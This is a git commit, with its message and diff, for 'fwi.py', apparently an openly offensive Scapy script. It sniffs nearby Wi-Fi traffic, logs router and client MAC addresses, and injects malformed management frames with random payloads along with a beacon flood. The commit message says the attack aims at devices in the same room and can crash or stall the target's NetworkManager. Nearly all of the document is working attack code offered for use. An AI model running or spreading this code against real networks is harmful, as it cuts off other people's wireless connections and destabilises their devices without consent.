a0bb785e7b1ae1386821d25b054711459b772e4e
BlackEndless <127990034+BlackEnd1ess@users.noreply.github.com>
2024-03-27 14:35:46 +0100

    Update fwi.py
    - This Script will only Attack Devices nearby or in same Room.
    - More Sniff results by adding subtype 12.
    - Beacon Attack: If Vicitim doesnt disconnect, then the NetworkManager of Trarget will crash or stop working for a while (be careful!)
    - Random character (255) more valid bytes.

--- fwi.py
+++ fwi.py
@@ -7,15 +7,17 @@ mon=a
 def packet_handler(packet):
 	if packet.haslayer(Dot11):
 		def dd(B,st):
-			return st.join(chr(random.randint(0,285)) for _ in range(random.randint(32,B)))
-		if packet.type == 2 and packet.subtype in [4,10,8]:# and packet.dBm_AntSignal > -60:
+			return st.join(chr(random.randint(0,255)) for _ in range(random.randint(27,B)))
+		if packet.type == 2 and packet.subtype in [4,10,8,12] and packet.dBm_AntSignal < -40:
 			l0=packet.addr1
 			l1=packet.addr2
 			l2=packet.addr3
 			print(f'<SCAN> ROUTER={packet.addr3} ::: CLIENT={packet.addr2} ::: BDCAST={packet.addr1}')
 			#print(repr(packet))
-			ph=RadioTap()/Dot11(addr1=[l0,l2],addr2=[l1,l2],addr3=[l2,l0],type=0,subtype=[0,4,10])/Raw(dd(B=372,st='\x00'))
+			ph=RadioTap()/Dot11(addr1=[l0,l2],addr2=[l1,l2],addr3=[l2,l0],type=0,subtype=[0,2,4,10])/Raw(dd(B=128,st='\x00'))
+			pf=RadioTap()/Dot11(addr1=l1,addr2=l2,addr3=l2,type=[0,1],subtype=8)
 			sendp(ph,iface=mon,count=1,verbose=0)
+			sendp(pf,iface=mon,count=32,verbose=0)
 os.system('clear')
 print('<INTERFACE> scanning WIFI Access Points..')
 sniff(iface=mon,prn=packet_handler)
